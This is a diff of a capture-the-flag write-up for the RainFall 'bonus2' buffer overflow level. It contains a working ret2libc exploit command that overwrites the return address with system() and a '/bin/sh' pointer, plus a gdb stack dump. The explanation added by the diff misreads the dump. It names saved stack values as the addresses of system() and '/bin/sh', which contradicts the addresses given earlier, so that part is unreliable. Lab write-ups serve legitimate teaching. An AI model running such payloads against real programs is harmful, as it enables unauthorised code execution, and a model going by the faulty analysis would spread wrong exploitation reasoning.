@@ -1,6 +1,9 @@
 ##  Description
 
-LANG=fi ./bonus2 $(python -c "print 'A'*53 + 'BBBB' + adresse_system") $(python -c "print 'CCCC' + adresse_bin_sh")
+This level is a case of buffer overflow. The program reads the environment variable "LANG" and sets a global flag accordingly.
+Depending on the value of this flag, the program will save the user greeting in a specific language into a buffer before concatenating it with the main buffer that is filled with the user input. The program then prints the main buffer and exits.
+
+
 
 0xb7e6b060
 system()
@@ -9,17 +12,27 @@ bonus2@RainFall:~$ python -c "print hex(0xb7e00000 + 1444952)"
 0xb7f60c58L
 /bin/sh
 
-LANG=fi ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*14 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")
-
-#include <stdio.h>
-#include <stdlib.h>
-
-int main()
-{
-    printf("%p\n", getenv("BINSH"));
-    return 0;
-}
-
 Final:
 
 LANG=fi ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*18 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")
+
+(gdb) x/64wx $ebp
+0xbffff578:     0xbffff638      0x08048630      0x41414141      0x41414141
+0xbffff588:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff598:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff5a8:     0x42424242      0x42424242      0x00000000      0x00000000
+0xbffff5b8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff5c8:     0x00000000      0xb7e5ec73      0x41414141      0x41414141
+0xbffff5d8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff5e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff5f8:     0x42424242      0x42424242      0x00000000      0x00000000
+0xbffff608:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff618:     0x00000000      0xbffffef0      0xb7fed280      0x00000000
+0xbffff628:     0x08048649      0xb7fd0ff4      0x00000000      0x00000000
+0xbffff638:     0x00000000      0xb7e454d3      0x00000003      0xbffff6d4
+0xbffff648:     0xbffff6e4      0xb7fdc858      0x00000000      0xbffff61c
+0xbffff658:     0xbffff6e4      0x00000000      0x0804823c      0xb7fd0ff4
+0xbffff668:     0x00000000      0x00000000      0x00000000      0x219437e3
+
+So the buffers are located at 0xbffff578 and 0xbffff5a8, the return address is located at 0xbffff5c8 and the address of system() is located at 0xb7e5ec73.
+The address of "/bin/sh" is located at 0xb7e454d3. We need to overwrite the return address with the address of system() and put the address of "/bin/sh" as an argument to system().
